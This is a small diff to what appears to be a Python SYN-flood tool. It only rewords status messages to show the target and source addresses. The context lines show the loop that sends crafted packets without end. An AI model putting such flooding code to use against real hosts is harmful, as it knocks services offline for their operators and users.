@@ -62,7 +62,7 @@ frame.ether_type = 0x0800
 
 src_port = 0
 count = 0
-tools.print_rgb('start SYN flooding...', rgb=(200, 0, 0), bold=True)
+tools.print_rgb(f'SYN flooding {dst_ip}:{dst_port}', rgb=(200, 0, 0), bold=True)
 try:
     while True:
         src_port = (src_port + 1) & 0xffff
@@ -71,7 +71,7 @@ try:
         frame.payload = packet.get_bytes()
         frame.send(socket)
         count += 1
-        info = f'\rport: {src_port} packets sent: {count:20}'
+        info = f'\rsrc: {src_ip}:{src_port} -- packets sent: {count:<20}'
         tools.print_rgb(info, rgb=(200, 200, 200), bold=True, end='')
 except KeyboardInterrupt:
     tools.print_rgb('\nstopped; Goodbye!', rgb=(0, 200, 0), bold=True)
